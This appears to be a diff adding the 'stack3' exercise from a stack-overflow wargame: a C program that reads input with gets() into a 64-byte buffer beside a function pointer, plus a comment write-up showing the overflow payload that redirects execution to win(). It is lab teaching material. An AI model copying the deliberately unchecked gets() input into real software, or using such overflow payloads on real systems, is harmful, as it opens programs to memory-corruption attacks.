@@ -1,0 +1,57 @@
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+void win()
+{
+  printf("code flow successfully changed\n");
+}
+
+int main(int argc, char **argv)
+{
+  volatile int (*fp)();
+  char buffer[64];
+
+  fp = 0;
+
+  gets(buffer);
+
+  if(fp) {
+      printf("calling function pointer, jumping to 0x%08x\n", fp);
+      fp();
+  }
+}
+
+/*
+ * For this challenge we needed to overflow the buffer with 64 characters and then put the address of the win() function into the function
+ * pointer. This will cause win() to be called whenever the function pointer is executed. The first step was to findout where the win()
+ * was located in memory. I used the command 'objdump -d stack3' which gave me this:
+ *
+ * 08048424 <win>:
+ *  8048424:       55                      push   %ebp
+ *  8048425:       89 e5                   mov    %esp,%ebp
+ *  8048427:       83 ec 18                sub    $0x18,%esp
+ *  804842a:       c7 04 24 40 85 04 08    movl   $0x8048540,(%esp)
+ *  8048431:       e8 2a ff ff ff          call   8048360 <puts@plt>
+ *  8048436:       c9                      leave  
+ *  8048437:       c3                      ret
+ * 
+ * As we can see, win() is located at 0x08048424 in memory. All I need to do is have the ascii characters 0x08, 0x04, 0x84, and 0x24 so I
+ * can put them at the end of the input string. Now to the ascii table and...frack it all. Three of those are non printable ascii characters.
+ * How can I get around this... ... ... a ha! Use an environment variable just like in stack 2! Gotta remember that our processor is lil
+ * endian. Our env gets set up like this:
+ *
+ * export GREENIE=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$'\x24'$'\x84'$'\x04'$'\x08'
+ *
+ * You can put actual hex values into a linux environment by doing $'\x[value]' where [value] is whatever hex you want i.e 08
+ *
+ * Then I just pipe the value of our env into stack3's input:
+ *
+ * printenv GREENIE | ./stack3
+ *
+ * and viola!
+ *
+ * calling function pointer, jumping to 0x08048424
+ * code flow successfully changed
+ */
